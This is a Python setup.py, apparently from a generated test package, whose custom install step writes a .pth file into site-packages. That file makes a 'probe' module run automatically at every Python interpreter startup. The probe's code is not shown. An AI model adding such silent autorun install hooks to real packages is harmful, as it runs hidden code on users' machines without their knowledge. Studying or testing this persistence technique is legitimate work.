from pathlib import Path

from setuptools import setup
from setuptools.command.install_lib import install_lib

PTH_CONTENT = "import gt_tester_exp_profiler_exp_00000015.probe; gt_tester_exp_profiler_exp_00000015.probe.run_probe()\n"


class InstallLibWithPth(install_lib):
    def run(self):
        install_lib.run(self)
        if not self.install_dir:
            return
        pth_path = Path(self.install_dir) / "gt_tester_exp_profiler_exp_00000015_probe.pth"
        pth_path.write_text(PTH_CONTENT, encoding="utf-8")


setup(cmdclass={"install_lib": InstallLibWithPth})
